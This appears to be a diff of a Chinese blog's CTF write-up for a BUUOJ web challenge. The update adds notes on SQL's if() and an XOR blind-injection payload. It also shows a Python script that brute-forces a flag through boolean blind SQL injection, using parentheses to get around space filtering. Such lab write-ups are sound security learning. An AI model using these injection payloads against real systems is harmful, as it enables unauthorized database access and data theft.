@@ -38,7 +38,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png">
 <meta property="article:published_time" content="2021-09-26T15:58:03.000Z">
-<meta property="article:modified_time" content="2021-09-26T17:27:49.754Z">
+<meta property="article:modified_time" content="2021-09-27T00:54:42.519Z">
 <meta property="article:author" content="Haorical">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
@@ -151,7 +151,7 @@
         <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">17</span></a></li>
         <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">43</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a></li>
         <li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
         <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
       <li class="menu-item menu-item-search">
@@ -226,7 +226,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -323,7 +323,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-09-27 01:27:49" itemprop="dateModified" datetime="2021-09-27T01:27:49+08:00">2021-09-27</time>
+        <time title="修改时间：2021-09-27 08:54:42" itemprop="dateModified" datetime="2021-09-27T08:54:42+08:00">2021-09-27</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -366,7 +366,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.7k</span>
+      <span>1.8k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -389,6 +389,13 @@
 <p>这个题呢，最终就是直接跑脚本</p>
 <p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
 <p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
+<p>sql的三目运算</p>
+<pre><code>if( 表达式1，表达式2，表达式3)
+</code></pre>
+<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
+<p>或者异或注入</p>
+<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
+</code></pre>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>看到<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
 <blockquote>
@@ -401,8 +408,9 @@
 <p>bool(false)</p>
 <p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
 <p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
 
+<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
 <p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
 <p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
 
@@ -532,13 +540,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">105k</span>
+    <span title="站点总字数">107k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:55</span>
+    <span title="站点阅读时长">2:59</span>
   </span>
 </div>
 <div class="busuanzi-count">
